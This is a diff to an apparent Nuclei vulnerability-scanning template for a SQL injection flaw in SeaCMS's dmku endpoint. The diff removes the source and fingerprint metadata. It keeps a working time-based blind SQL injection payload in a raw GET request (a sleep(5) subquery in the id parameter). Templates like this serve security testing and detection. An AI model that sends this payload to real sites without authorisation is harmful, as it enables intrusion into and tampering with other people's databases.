@@ -3,14 +3,8 @@ info:
   name: SeaCMS海洋影视管理系统dmku SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nbga1xgr98qspdtn
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nbga1xgr98qspdtn
-    fofa: app="海洋CMS"
 http:
 - raw:
   - 'GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(5)))v)&type=list HTTP/1.1
